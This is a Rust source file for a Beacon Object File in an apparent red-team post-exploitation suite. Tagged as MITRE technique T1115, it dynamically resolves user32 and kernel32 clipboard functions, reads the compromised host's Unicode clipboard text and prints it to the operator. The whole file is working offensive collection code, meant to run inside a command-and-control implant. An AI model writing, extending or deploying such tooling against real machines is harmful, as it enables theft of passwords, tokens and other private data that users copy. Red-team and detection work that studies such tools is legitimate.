// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening — by Dani
//
#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1115", name: "Clipboard Data", tactic: "Collection" },
];

const CF_UNICODETEXT: u32 = 13;

dfr_fn!(
    open_clipboard(hwnd: usize) -> i32,
    module = "user32.dll",
    api    = "OpenClipboard"
);

dfr_fn!(
    close_clipboard() -> i32,
    module = "user32.dll",
    api    = "CloseClipboard"
);

dfr_fn!(
    get_clipboard_data(format: u32) -> usize,
    module = "user32.dll",
    api    = "GetClipboardData"
);

dfr_fn!(
    global_lock(hmem: usize) -> *const u16,
    module = "kernel32.dll",
    api    = "GlobalLock"
);

dfr_fn!(
    global_unlock(hmem: usize) -> i32,
    module = "kernel32.dll",
    api    = "GlobalUnlock"
);

dfr_fn!(
    global_size(hmem: usize) -> usize,
    module = "kernel32.dll",
    api    = "GlobalSize"
);

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    unsafe { open_clipboard(0) }.map_err(|_| "OpenClipboard resolve failed")?;

    let hdata = unsafe { get_clipboard_data(CF_UNICODETEXT) }
        .map_err(|_| "GetClipboardData resolve")?;

    if hdata == 0 {
        unsafe { let _ = close_clipboard(); };
        println!("[*] Clipboard is empty or non-text");
        return Ok(());
    }

    let size_bytes = unsafe { global_size(hdata) }.map_err(|_| "GlobalSize resolve")?;
    let ptr = unsafe { global_lock(hdata) }.map_err(|_| "GlobalLock resolve")?;

    if !ptr.is_null() {
        let max_wchars = size_bytes / 2;
        let mut line = [0u8; 4096];
        let mut len = 0usize;
        for i in 0..max_wchars {
            let wc = unsafe { core::ptr::read_volatile(ptr.add(i)) };
            if wc == 0 { break; }
            if len < line.len() {
                line[len] = if wc < 128 { wc as u8 } else { b'?' };
                len += 1;
            }
        }
        let s = core::str::from_utf8(&line[..len]).unwrap_or("?");
        println!("CLIPBOARD CONTENT:");
        println!("{}", s);
    }

    unsafe {
        let _ = global_unlock(hdata);
        let _ = close_clipboard();
    };
    Ok(())
}
